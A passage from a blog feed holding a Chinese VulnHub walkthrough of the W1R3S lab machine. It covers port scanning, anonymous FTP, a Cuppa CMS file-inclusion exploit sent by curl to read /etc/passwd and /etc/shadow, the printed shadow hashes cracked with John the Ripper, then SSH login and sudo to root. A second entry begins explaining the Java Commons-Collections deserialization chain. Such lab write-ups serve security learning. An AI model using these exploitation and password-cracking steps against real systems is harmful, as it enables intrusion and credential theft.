    <content type="html"><![CDATA[<p>下载好靶机 </p><p>然后先在本地进行扫描确定靶机的ip地址</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 192.168.205.0/24</span><br></pre></td></tr></table></figure><p>发现</p><p>Starting Nmap 7.95 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2025-03-25 04:03 EDT<br>Nmap scan report for 192.168.205.1 (192.168.205.1)<br>Host is up (0.0012s latency).<br>MAC Address: 00:50:56:C0:00:01 (VMware)<br>Nmap scan report for 192.168.205.2 (192.168.205.2)<br>Host is up (0.00089s latency).<br>MAC Address: 00:50:56:F7:4F:9C (VMware)<br>Nmap scan report for 192.168.205.136 (192.168.205.136)<br>Host is up (0.00074s latency).<br>MAC Address: 00:0C:29:19:D7:D3 (VMware)<br>Nmap scan report for 192.168.205.254 (192.168.205.254)<br>Host is up (0.00077s latency).<br>MAC Address: 00:50:56:E0:48:99 (VMware)<br>Nmap scan report for 192.168.205.128 (192.168.205.128)<br>Host is up.<br>Nmap done: 256 IP addresses (5 hosts up) scanned in 2.00 seconds</p><p>这条命令等同于 </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure><p>Interface: eth0, type: EN10MB, MAC: 00:0c:29:e7:49:b2, IPv4: 192.168.205.128<br>WARNING: Cannot open MAC&#x2F;Vendor file ieee-oui.txt: Permission denied<br>WARNING: Cannot open MAC&#x2F;Vendor file mac-vendor.txt: Permission denied<br>Starting arp-scan 1.10.0 with 256 hosts (<a href="https://github.com/royhills/arp-scan">https://github.com/royhills/arp-scan</a>)<br>192.168.205.1   00:50:56:c0:00:01       (Unknown)<br>192.168.205.2   00:50:56:f7:4f:9c       (Unknown)<br>192.168.205.136 00:0c:29:19:d7:d3       (Unknown)<br>192.168.205.254 00:50:56:e0:48:99       (Unknown)</p><p>136是我们的靶机地址</p><p>接下来我们对这个地址进行一个tcp的扫描</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sT --min-rate 10000 -p- 192.168.205.136 -oA  nmapscan/ports</span><br></pre></td></tr></table></figure><p>Starting Nmap 7.95 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2025-03-25 04:17 EDT<br>Nmap scan report for 192.168.205.136 (192.168.205.136)<br>Host is up (0.00034s latency).<br>Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE<br>21&#x2F;tcp   open  ftp<br>22&#x2F;tcp   open  ssh<br>80&#x2F;tcp   open  http<br>3306&#x2F;tcp open  mysql<br>MAC Address: 00:0C:29:19:D7:D3 (VMware)</p><p>发现4个端口</p><p>-oA  nmapscan&#x2F;ports 这里是为了数据化扫描结果</p><p>如果扫描过程中遇到的端口数量过大的情况下我们就可以进行一个筛选</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep open nmapscan/ports.nmap</span><br></pre></td></tr></table></figure><p>21&#x2F;tcp   open  ftp<br>22&#x2F;tcp   open  ssh<br>80&#x2F;tcp   open  http<br>3306&#x2F;tcp open  mysql</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">grep open nmapscan/ports.nmap |awk -F<span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line"><span class="number">21</span></span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="number">80</span></span><br><span class="line"><span class="number">3306</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里用来提权端口（这一切都是基于如果扫描出来的端口数量过大的情况下，我们需要，这里为了养成习惯所以细致一些）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep open nmapscan/ports.nmap |awk -F&#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27;|paste -sd &#x27;,&#x27;</span><br><span class="line">21,22,80,3306</span><br></pre></td></tr></table></figure><p>将端口提取到一行</p><p>将这些赋值给port的变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ports=$(grep open nmapscan/ports.nmap |awk -F&#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27;|paste -sd &#x27;,&#x27;)</span><br></pre></td></tr></table></figure><p>接下来对其进行详细信息扫描</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -O -p21,22,80,3306 192.168.205.136 -oA nmapscan/detail</span><br></pre></td></tr></table></figure><p>-sV是对网站信息进行扫描，-sC是默认脚本 -O是操作系统 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.205.128</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content</span><br><span class="line">| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs</span><br><span class="line">|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)</span><br><span class="line">|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)</span><br><span class="line">|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:19:D7:D3 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 5.1 - 5.15 (95%), Linux 3.13 - 4.4 (93%), Linux 3.8 - 3.16 (93%), Linux 4.10 (93%), Linux 3.4 - 3.10 (93%), Linux 3.10 (93%), Linux 3.13 - 3.16 (92%), Linux 4.4 (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.41 seconds</span><br></pre></td></tr></table></figure><p>在扫描的过程中我们可以进行一下udp的一个扫描</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sU --top-ports 20 192.168.205.136 -oA nmapscan/udp</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 05:22 EDT</span><br><span class="line">Nmap scan report for 192.168.205.136 (192.168.205.136)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">53/udp    open|filtered domain</span><br><span class="line">67/udp    open|filtered dhcps</span><br><span class="line">68/udp    open|filtered dhcpc</span><br><span class="line">69/udp    open|filtered tftp</span><br><span class="line">123/udp   open|filtered ntp</span><br><span class="line">135/udp   open|filtered msrpc</span><br><span class="line">137/udp   open|filtered netbios-ns</span><br><span class="line">138/udp   open|filtered netbios-dgm</span><br><span class="line">139/udp   open|filtered netbios-ssn</span><br><span class="line">161/udp   open|filtered snmp</span><br><span class="line">162/udp   open|filtered snmptrap</span><br><span class="line">445/udp   open|filtered microsoft-ds</span><br><span class="line">500/udp   open|filtered isakmp</span><br><span class="line">514/udp   open|filtered syslog</span><br><span class="line">520/udp   open|filtered route</span><br><span class="line">631/udp   open|filtered ipp</span><br><span class="line">1434/udp  open|filtered ms-sql-m</span><br><span class="line">1900/udp  open|filtered upnp</span><br><span class="line">4500/udp  open|filtered nat-t-ike</span><br><span class="line">49152/udp open|filtered unknown</span><br><span class="line">MAC Address: 00:0C:29:19:D7:D3 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.72 second</span><br></pre></td></tr></table></figure><p>还有进行nmap 漏洞脚本进行扫描</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> sudo nmap --script=vuln -p21,80,22,3306 192.168.205.136 -oA nmapscan/vuln</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 05:25 EDT</span><br><span class="line">Nmap scan report for 192.168.205.136 (192.168.205.136)</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#x27;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /wordpress/wp-login.php: Wordpress login page.</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">MAC Address: 00:0C:29:19:D7:D3 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 322.12 seconds</span><br></pre></td></tr></table></figure><p>这里没有发现可利用漏洞 ddos就不考虑了 </p><p>然后分析刚刚的详细扫描</p><p>21&#x2F;tcp   open  ftp     vsftpd 2.0.8 or later</p><p>21端口 ftp 使用的是vsftpd 后缀带d基本上可以使用匿名登录</p><p>信息收集就到这 端口扫描 详细端口扫描 udp扫描 利用漏洞脚本扫描，可能还会有ipv6的扫描</p><p>匿名登录</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ftp 192.168.205.136</span><br><span class="line">Connected to 192.168.205.136.</span><br><span class="line">220 Welcome to W1R3S.inc FTP service.</span><br><span class="line">Name (192.168.205.136:kali): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br></pre></td></tr></table></figure><p>这里注意ftp要切换成二进制模式 </p><p>发现三个目录</p><p>drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content<br>drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs<br>drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</p><p>分别进入目录将里面的txt文件下载下来</p><p>将下载的文件全部读取出来</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat *.txt        </span><br><span class="line">New FTP Server For W1R3S.inc</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line">01ec2d8fc11c493b25029fb1f47f39ce</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################</span></span></span><br><span class="line">___________.__              __      __  ______________________   _________    .__               </span><br><span class="line">\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  </span><br><span class="line">  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  &lt; \_____  \     |  |/    \_/ ___\ </span><br><span class="line">  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___ </span><br><span class="line">  |____|   |___|  /\___  &gt;   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  &gt;</span><br><span class="line">                \/     \/         \/                \/       \/        \/  \/         \/     \/ </span><br><span class="line">The W1R3S.inc employee list</span><br><span class="line"></span><br><span class="line">Naomi.W - Manager</span><br><span class="line">Hector.A - IT Dept</span><br><span class="line">Joseph.G - Web Design</span><br><span class="line">Albert.O - Web Design</span><br><span class="line">Gina.L - Inventory</span><br><span class="line">Rico.D - Human Resources</span><br><span class="line"></span><br><span class="line">​    ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡</span><br><span class="line"></span><br><span class="line">....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ</span><br></pre></td></tr></table></figure><p>利用hash-identifier 对加密算法进行识别</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hash-identifier </span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))</span><br></pre></td></tr></table></figure><p>识别告诉我是md5</p><p>网站进行解码</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/90846274a1ac666ce6acec9ef9150df.png"></p><p>This[空格]is[空格]not[空格]a[空格]password</p><p>提示这不是密码</p><p>对这里面的base64进行解密</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</span><br><span class="line">&quot;|base64 -d</span><br><span class="line">It is easy, but not that easy..</span><br></pre></td></tr></table></figure><p>左脑攻击右脑 </p><p>The W1R3S.inc employee list</p><p>Naomi.W - Manager<br>Hector.A - IT Dept<br>Joseph.G - Web Design<br>Albert.O - Web Design<br>Gina.L - Inventory<br>Rico.D - Human Resources</p><p>员工信息 待会说不定有用这里分好了职位</p><p>好了ftp就是这些信息</p><p>对80端口进行测试</p><p>web页面没发现有用的东西</p><p>爆破目录</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo gobuster dir -u http://192.168.205.136 --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br></pre></td></tr></table></figure><p>&#x2F;wordpress            (Status: 301) [Size: 322] [–&gt; <a href="http://192.168.205.136/wordpress/]">http://192.168.205.136/wordpress/]</a><br>&#x2F;javascript           (Status: 301) [Size: 323] [–&gt; <a href="http://192.168.205.136/javascript/]">http://192.168.205.136/javascript/]</a><br>&#x2F;administrator        (Status: 301) [Size: 326] [–&gt; <a href="http://192.168.205.136/administrator/]">http://192.168.205.136/administrator/]</a><br>&#x2F;server-status        (Status: 403) [Size: 303]</p><p>amdinistrator可以直接进入 是个cms</p><p>wordpress进行一个跳转 到localhost&#x2F;wordpress&#x2F;</p><p>这里不确定是不是kali环境问题所以先对另一个cms进行测试</p><p>测试出来发现不能进行安装</p><p>查看历史漏洞</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">earchsploit cuppa    </span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"></span><br><span class="line"> Exploit Title                                                                                                                                             |  Path</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"></span><br><span class="line">Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion                                                                                            | php/webapps/25971.txt</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"></span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>发现25971 给他下载下来</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">earchsploit cuppa -m 25971</span><br><span class="line">[!] Could not find EDB-ID #</span><br><span class="line"></span><br><span class="line">  Exploit: Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/25971</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt</span><br><span class="line">    Codes: OSVDB-94101</span><br><span class="line"> Verified: True</span><br><span class="line">File Type: C++ source, ASCII text, with very long lines (876)</span><br><span class="line">Copied to: /home/kali/Desktop/w1r3s/25971.txt</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现利用方式是文件包含我们看他给的payload能不能测试成功</p><p>发现是不行的 </p><p>蒋cuppr那修改下 成administrator</p><p>发现是由回显但是没有爆出内容</p><p><a href="http://192.168.205.136/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.205.136/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p><p>这个时候考虑是不是利用POST的或是其他的东西 </p><p>curl –data-urlencode “urlConfig&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<br>“ <a href="http://192.168.205.136/administrator/alerts/alertConfigField.php">http://192.168.205.136/administrator/alerts/alertConfigField.php</a></p><p>发现列出passwd 信息</p><p>那么我们可以进一步查看shadow</p><p>得到密码进行筛选有哈希值的账户</p><p>root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx.&#x2F;ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</p><p>www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8&#x2F;0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</p><p>w1r3s:$6$xe&#x2F;eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb&#x2F;io7x9q1iP.:17567:0:99999:7:::</p><p>得到这些 我们进行对哈希进行解密</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john md5.hash </span><br><span class="line">Created directory: /home/kali/.john</span><br><span class="line">Warning: detected hash type &quot;sha512crypt&quot;, but the string is also recognized as &quot;HMAC-SHA256&quot;</span><br><span class="line">Use the &quot;--format=HMAC-SHA256&quot; option to force loading these as that type instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Cost 1 (iteration count) is 5000 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">www-data         (www-data)     </span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">computer         (w1r3s)     </span><br><span class="line">Proceeding with incremental:ASCII</span><br></pre></td></tr></table></figure><p>进行ssh远程登录</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ssh w1r3s@192.168.205.136</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Think this is the way?</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Well,........possibly.</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">w1r3s@192.168.205.136&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">108 packages can be updated.</span><br><span class="line">6 updates are security updates.</span><br><span class="line"></span><br><span class="line">.....You made it huh?....</span><br><span class="line">Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35</span><br></pre></td></tr></table></figure><p>登录成功可以直接sudo提权</p><p>获取flag</p><h2 id="root-W1R3S-cat-flag-txt"><a href="#root-W1R3S-cat-flag-txt" class="headerlink" title="root@W1R3S:~# cat flag.txt "></a>root@W1R3S:~# cat flag.txt </h2><hr><h2 id=""><a href="#" class="headerlink" title="  &#x2F; _&#x2F; _ | \ | |&#x2F; _|  _ \    &#x2F; |   | | | | |      &#x2F; |   | _&#x2F; _ | \ | &#x2F; _| | |  | | | |  | | |  | |) |  &#x2F; _ \ | | | | | | |     &#x2F; _ \ | |  | | | | |  | __ \ | || || | |\  | || |  _ &lt;  &#x2F; ___ | | | |_| | |_ &#x2F; ___ | |  | | || | |\  |) |  ____&#x2F;|| _|__|| _/_&#x2F;   __|  _&#x2F;|_____&#x2F;&#x2F;   __| |_&#x2F;|| _|____&#x2F;                                                                                         "></a>  &#x2F; <strong>_&#x2F; _ | \ | |&#x2F; <em>_<em>|  _ \    &#x2F; |</em>   <em>| | | | |      &#x2F; |</em>   <em>|</em> _&#x2F; _ | \ | &#x2F; <em>_<em>|<br> | |  | | | |  | | |  <em>| |</em>) |  &#x2F; _ \ | | | | | | |     &#x2F; _ \ | |  | | | | |  | _</em>_ \<br> | |</em><em>| |</em>| | |\  | |</em>| |  _ &lt;  &#x2F; ___ | | | |_| | |</strong>_ &#x2F; ___ | |  | | |<em>| | |\  |</em><strong>) |<br>  _</strong><em>___&#x2F;|</em>| _|_<em>_<em>|</em>| _/_&#x2F;   __|  _</em><em>&#x2F;|_____&#x2F;</em>&#x2F;   __| |<em><strong>_</strong>&#x2F;|</em>| _|____&#x2F;                                                                                         </h2><pre><code>                      .-----------------TTTT_-----_______                    /&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;(______O] ----------____  \______/]_ __...---&#39;&quot;&quot;&quot;\_ --&#39;&#39;   Q                               ___________@</code></pre><p> |’’’                   ._   _______________&#x3D;———“””””””<br> |                ..–’’|   l L |_l   |<br> |          ..–’’      .  &#x2F;-_<strong>j ‘   ‘<br> |    ..–’’           &#x2F;  ,       ‘   ‘<br> |–’’                &#x2F;           &#96;    <br>                      L</strong>‘         \    -<br>                                    -    ‘-.<br>                                     ‘.    &#x2F;<br>                                       ‘-.&#x2F;</p><hr><h2 id="YOU-HAVE-COMPLETED-THE-INC-CHALLENGE-V-1-0"><a href="#YOU-HAVE-COMPLETED-THE-INC-CHALLENGE-V-1-0" class="headerlink" title="  YOU HAVE COMPLETED THE               __      __  ______________________   _________              &#x2F;  \    &#x2F;  /_   ______   _____  \ &#x2F;   &#x2F;              \   //   &#x2F; |   ||       &#x2F; (  &lt; __  \               \        &#x2F;  |   ||    |   /       /                        __&#x2F;\  &#x2F;   ||||  &#x2F;____  &#x2F;_______  &#x2F;.INC                     /                /       /        /        CHALLENGE, V 1.0"></a>  YOU HAVE COMPLETED THE<br>               __      __  ______________________   _________<br>              &#x2F;  \    &#x2F;  /_   ______   _____  \ &#x2F;   <strong><em><strong>&#x2F;<br>              \   //   &#x2F; |   ||       <em>&#x2F; <em>(</em></em>  &lt; _</strong></em>_  \<br>               \        &#x2F;  |   ||    |   /       /        <br>                __&#x2F;\  &#x2F;   |</strong><em>||</em><strong><em>|</em>  &#x2F;</strong>____  &#x2F;_______  &#x2F;.INC<br>                     /                /       /        /        CHALLENGE, V 1.0</h2><p>CREATED BY SpecterWires</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;下载好靶机 &lt;/p&gt;
&lt;p&gt;然后先在本地进行扫描确定靶机的ip地址&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo nmap -sn 1</summary>
      
    
    
    
    
    <category term="vulnhub" scheme="https://gu0f3n.github.io/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>cc6</title>
    <link href="https://gu0f3n.github.io/2025/03/24/cc6/"/>
    <id>https://gu0f3n.github.io/2025/03/24/cc6/</id>
    <published>2025-03-24T11:21:15.000Z</published>
    <updated>2025-03-27T01:33:11.682Z</updated>
    
    <content type="html"><![CDATA[<p>   之前复现了java cc1链子 </p><p>顺便在这进行一个总结</p><h4 id="核心武器：反射万能钥匙（InvokerTransformer）"><a href="#核心武器：反射万能钥匙（InvokerTransformer）" class="headerlink" title="核心武器：反射万能钥匙（InvokerTransformer）"></a><strong>核心武器：反射万能钥匙（<code>InvokerTransformer</code>）</strong></h4><p><strong>比喻</strong>：<code>InvokerTransformer</code>类像一把万能钥匙，能通过反射调用任何方法。比如用钥匙打开“Runtime类”的锁，执行<code>exec(&quot;calc&quot;)</code>弹计算器</p><h4 id="流水线组装：串联工具人（ChainedTransformer）"><a href="#流水线组装：串联工具人（ChainedTransformer）" class="headerlink" title="流水线组装：串联工具人（ChainedTransformer）"></a><strong>流水线组装：串联工具人（<code>ChainedTransformer</code>）</strong></h4><p><strong>比喻</strong>：为了绕过限制，攻击者需要多个“工具人”协作。<code>ChainedTransformer</code>就像一个流水线，把多个操作串联起来：</p><p>工具人A：先拿到<code>Runtime</code>对象（<code>ConstantTransformer</code></p><p>工具人B：用万能钥匙调用<code>exec</code>方法（<code>InvokerTransformer</code>）</p><p><strong>原理</strong>：把这两个工具人按顺序放进<code>ChainedTransformer</code>，执行时会先获取<code>Runtime</code>对象，再调用<code>exec</code>方法。</p><h4 id="触发机关：改造地图（TransformedMap）"><a href="#触发机关：改造地图（TransformedMap）" class="headerlink" title="触发机关：改造地图（TransformedMap）"></a><strong>触发机关：改造地图（<code>TransformedMap</code>）</strong></h4><p><strong>比喻</strong>：<code>TransformedMap</code>是一个被魔改的地图，当地图中的值被修改时（比如调用<code>setValue</code>），会自动触发流水线上的工具人</p><h4 id="点火开关：反序列化入口（AnnotationInvocationHandler）"><a href="#点火开关：反序列化入口（AnnotationInvocationHandler）" class="headerlink" title="点火开关：反序列化入口（AnnotationInvocationHandler）"></a><strong>点火开关：反序列化入口（<code>AnnotationInvocationHandler</code>）</strong></h4><p><strong>比喻</strong>：<code>AnnotationInvocationHandler</code>是Java自带的“快递拆包员”，反序列化时会自动执行<code>readObject</code>方法（拆包裹逻辑）。攻击者把魔改地图塞进它的<code>memberValues</code>属性</p><p><strong>触发流程</strong>：</p><p>反序列化时，<code>readObject</code>方法遍历地图中的键值对</p><p>遍历到某个键值对时，调用<code>setValue</code>修改值，触发魔改地图的机关</p><ul><li>机关启动流水线工具人，最终弹计算器。</li></ul><h3 id="高版本jdk的修改"><a href="#高版本jdk的修改" class="headerlink" title="高版本jdk的修改"></a>高版本jdk的修改</h3><p>在jdk8u_71之后，AnnotationInvocationHandler类被重写了，修改了readObject方法，里面没有了setValue方法。</p><p>通过</p><p>ChainedTransformer的transform方法的用法，定位到LazyMap的get方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> 